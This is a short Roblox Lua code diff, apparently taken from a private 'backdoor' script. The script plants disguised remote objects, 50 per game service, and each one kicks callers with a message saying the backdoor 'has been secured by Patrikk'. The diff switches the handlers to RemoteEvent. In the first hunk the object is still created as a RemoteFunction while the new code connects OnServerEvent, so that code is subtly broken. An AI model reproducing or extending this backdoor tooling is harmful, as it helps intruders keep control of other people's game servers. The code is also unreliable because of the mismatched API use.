@@ -3225,9 +3225,9 @@ for _, svc in ipairs(services) do
 
  local r = Instance.new("RemoteFunction")
  r.Name = "rbxAssetid_core__temp_3023g78"
- r.OnServerInvoke = function(plr)
+ r.OnServerEvent:Connect(function(plr)
   plr:Kick("Backdoor has been secured by Patrikk - Private Backdoor")
- end
+ end)
  r.Parent = p
 end
 ]])  
@@ -3249,11 +3249,11 @@ local services = {
 
 for _, svc in ipairs(services) do
   for r = 1, 50 do 
-    local s = Instance.new("RemoteFunction")
+    local s = Instance.new("RemoteEvent")
     s.Name = "patrik.bd_cssr6-O1"
-    s.OnServerInvoke = function(player)
+    s.OnServerEvent:Connect(function(player)
         player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
-    end
+    end)
     s.Parent = svc
     task.wait()
   end
